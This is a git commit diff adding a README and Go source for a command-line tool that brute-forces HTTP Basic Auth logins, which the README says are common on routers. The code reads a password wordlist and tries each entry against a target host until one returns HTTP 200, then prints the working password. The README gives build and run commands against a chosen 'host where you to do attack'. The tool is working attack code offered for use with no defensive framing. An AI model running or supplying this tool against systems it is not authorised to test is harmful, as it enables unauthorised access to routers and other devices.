01aad35ff605101154b0c0623cdc2b596c886ac5
gabriel <gabriel.cardoso010@gmail.com>
2017-12-18 17:29:07 -0200

    Second commit

--- README.md
+++ README.md
@@ -1,1 +1,27 @@
-### BruteForceBasicAuth
+### Brute Force Basic Auth
+Tool used to make brute force on basic auth heavily used in routers.
+
+### Prerequisites
+```
+GO
+git
+```
+
+## Getting Started
+```
+$mkdir -p $GOPATH/src/github.com/cardoso010 && cd $GOPATH/src/github.com/cardoso010
+$git clone https://github.com/cardoso010/BruteForceBasicAuth
+$go build
+$./BruteForceBasicAuth -h=192.168.10.1 -u=username -p=/home/user/wordlist.txt
+```
+-h -- host where you to do attack
+-u -- username
+-p -- path where wordlist is
+
+## Authors
+
+* **Gabriel Cardoso Luiz** - *Initial work* - [cardoso010](https://github.com/cardoso010)
+
+
+
+
--- main.go
+++ main.go
@@ -1,18 +1,43 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
+	"flag"
 	"fmt"
 	"net/http"
+	"os"
 )
 
 func main() {
-	user := "admin"
-	pass := "admin"
+	start()
 
-	ip := "192.168.10.1"
+	host, user, path := parseArgs()
+	listaPassword(user, host, path)
+}
 
-	url := conctUrl(user, pass, ip)
+func start() {
+	fmt.Println("==========================================================================")
+	fmt.Println("|                        BRUTE FORCE BASIC AUTH                          |")
+	fmt.Println("|------------------------------------------------------------------------|")
+	fmt.Println("|                              Execute                                   |")
+	fmt.Println("| go run main.go -h=192.168.10.1 -u=username -p=/home/user/wordlist.txt  |")
+	fmt.Println("|                                                                        |")
+	fmt.Println("==========================================================================")
+
+}
+
+func parseArgs() (string, string, string) {
+	var host, user, path string
+	flag.StringVar(&host, "h", "", "host")
+	flag.StringVar(&user, "u", "", "user")
+	flag.StringVar(&path, "p", "", "path wordlist")
+
+	flag.Parse()
+	return host, user, path
+}
+
+func validarPassword(url, pass string) {
 	resp, err := http.Get(url)
 
 	if err != nil {
@@ -21,18 +46,30 @@ func main() {
 
 	if resp.StatusCode == 200 {
 		fmt.Println("Password correct is ->", pass)
+		os.Exit(0)
 	}
-
-	fmt.Println("Resposta->>", resp)
 }
 
-func conctUrl(username, password, url string) string {
+func conctURL(username, password, host string) string {
 	var buffer bytes.Buffer
 	buffer.WriteString("http://")
 	buffer.WriteString(username)
 	buffer.WriteString(":")
 	buffer.WriteString(password)
 	buffer.WriteString("@")
-	buffer.WriteString(url)
+	buffer.WriteString(host)
 	return buffer.String()
+}
+
+func listaPassword(username, host, path string) {
+	file, err := os.Open(path)
+	if err != nil {
+		panic(err)
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		validarPassword(conctURL(username, scanner.Text(), host), scanner.Text())
+	}
 }
